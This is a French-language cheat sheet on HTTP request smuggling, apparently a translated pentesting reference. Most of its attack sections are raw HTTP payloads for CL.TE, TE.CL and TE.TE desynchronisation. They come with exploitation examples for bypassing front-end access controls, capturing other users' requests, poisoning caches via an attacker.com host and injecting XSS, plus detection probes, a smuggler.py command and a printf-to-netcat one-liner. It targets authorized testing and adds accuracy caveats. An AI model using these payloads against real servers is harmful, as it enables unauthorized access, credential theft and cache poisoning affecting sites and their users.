# 📦 Aide-mémoire sur le HTTP Request Smuggling

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Qu’est-ce que le Request Smuggling ?

Le **HTTP Request Smuggling** (« contrebande de requêtes HTTP ») exploite les divergences d’analyse des requêtes HTTP entre le serveur frontal (*front-end*, souvent un proxy) et le serveur applicatif en arrière-plan (*back-end*). Ces divergences permettent d’injecter des requêtes supplémentaires.

### Conséquences
- 🔴 **Contournement des contrôles de sécurité** — contournement du pare-feu applicatif (WAF) ou des listes de contrôle d’accès (ACL)
- 🔴 **Empoisonnement du cache web** — mise en cache de réponses malveillantes
- 🔴 **Vol d’identifiants** — capture des requêtes d’autres utilisateurs
- 🔴 **XSS** — injection de script réfléchie au moyen d’une requête dissimulée

---

## 🔍 Fonctionnement

### En-têtes concernés
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Types de vulnérabilités
| Type | En-tête utilisé par le frontal | En-tête utilisé par le serveur en arrière-plan |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Obfuscation des deux côtés | Un en-tête est ignoré |

> **Précision :** la ligne TE.TE du tableau est un raccourci du texte original. Les deux serveurs prennent en charge Transfer-Encoding, mais une obfuscation conduit l’un d’eux à l’ignorer ; le désaccord obtenu se comporte alors comme CL.TE ou TE.CL. Voir l’[explication de PortSwigger](https://portswigger.net/web-security/request-smuggling#te-te-behavior-obfuscating-the-te-header).


---

## 💉 Charges utiles d’attaque

> **Précision sur les exemples :** les valeurs Content-Length et les tailles de chunks ci-dessous sont reprises telles quelles du texte anglais ; certaines sont schématiques et ne correspondent pas nécessairement aux octets affichés. Les fins de ligne HTTP/1.1 sont normalement CRLF, et leur représentation dans un fichier Markdown peut modifier le comptage. Ces blocs illustrent le principe et ne garantissent pas une requête exploitable. La [RFC 9112, sections 6.2 et 6.3](https://www.rfc-editor.org/rfc/rfc9112.html#section-6.3), interdit à l’émetteur d’associer Content-Length et Transfer-Encoding et précise le traitement des messages ambigus.

### CL.TE (Content-Length → Transfer-Encoding)

**Le frontal utilise Content-Length ; le serveur en arrière-plan utilise Transfer-Encoding.**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Exploitation :**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Le frontal utilise Transfer-Encoding ; le serveur en arrière-plan utilise Content-Length.**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (obfuscation de Transfer-Encoding)

```http
# Obfusquer l’en-tête TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Exemples d’exploitation

### Contournement des contrôles du frontal
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Capture des requêtes d’autres utilisateurs
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*La requête de l’utilisateur suivant est ajoutée à `data=`.*

### Empoisonnement du cache par Request Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS par Request Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Détection

### Détection fondée sur le temps de réponse
```http
# Test CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Si le serveur en arrière-plan utilise TE, il attend le chunk "0"
# Expiration du délai = vulnérabilité potentielle
```

### Comparaison des réponses
```http
# Envoyer une requête dissimulée qui provoque une réponse 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Si la réponse suivante est 404 = vulnérable selon cet exemple
```

---

> **Précision sur la détection :** dans le test CL.TE, le serveur attend la suite du flux chunked, dont la fin est marquée par le chunk "0". Un délai d’attente ou une réponse 404 isolée ne prouve pas une désynchronisation. Il faut établir que la requête de test a effectivement perturbé une requête suivante ; le routage vers différents serveurs et les requêtes concurrentes influencent le résultat. Voir les [conditions de confirmation décrites par PortSwigger](https://portswigger.net/web-security/request-smuggling/finding#confirming-http-request-smuggling-vulnerabilities-using-differential-responses).

## 🛠️ Outils

### Extension Burp Suite
```
1. Installer l’extension "HTTP Request Smuggler"
2. Clic droit sur la requête → Extensions → Launch Smuggle Probe
3. Examiner les résultats pour repérer les vulnérabilités de Request Smuggling
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Méthode manuelle avec curl

> **Précision :** malgré le titre repris de l’original, la commande suivante utilise printf et nc (netcat), sans appeler curl.
```bash
# Remarque : curl normalise les en-têtes ; une connexion TCP brute peut être nécessaire
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Référence rapide

### Liste de contrôle pour la détection
```markdown
- [ ] Rechercher un proxy ou un répartiteur de charge (plusieurs serveurs)
- [ ] Tester les délais de réponse CL.TE
- [ ] Tester les délais de réponse TE.CL
- [ ] Essayer l’obfuscation de l’en-tête TE
- [ ] Vérifier au moyen d’une comparaison des réponses
```

### Indices courants
```
- Répartiteurs de charge (AWS ALB, HAProxy)
- Proxys inverses (nginx, Apache)
- Réseaux de diffusion de contenu, ou CDN (Cloudflare, Akamai)
- Conversion de HTTP/2 vers HTTP/1.1 (downgrade)
```

---

> **Précision :** la présence d’un proxy, d’un CDN ou d’un répartiteur de charge indique une architecture à examiner ; elle ne démontre pas une vulnérabilité. Le problème dépend d’un désaccord d’analyse entre composants, comme l’explique [PortSwigger](https://portswigger.net/web-security/request-smuggling#how-do-http-request-smuggling-vulnerabilities-arise).

## ⚠️ Remarques importantes

```
1. Les tests peuvent perturber les autres utilisateurs
2. Utiliser si possible des environnements de test isolés
3. Ajouter des identifiants uniques pour reconnaître ses requêtes
4. Signaler la vulnérabilité de manière responsable avec une preuve de concept (PoC)
```

---

## 📚 Ressources

- [HTTP Request Smuggling — PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [Attaques de désynchronisation HTTP (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Outil Smuggler](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Dissimulez des requêtes !</b><br>
  <i>Uniquement pour des tests autorisés !</i>
</p>
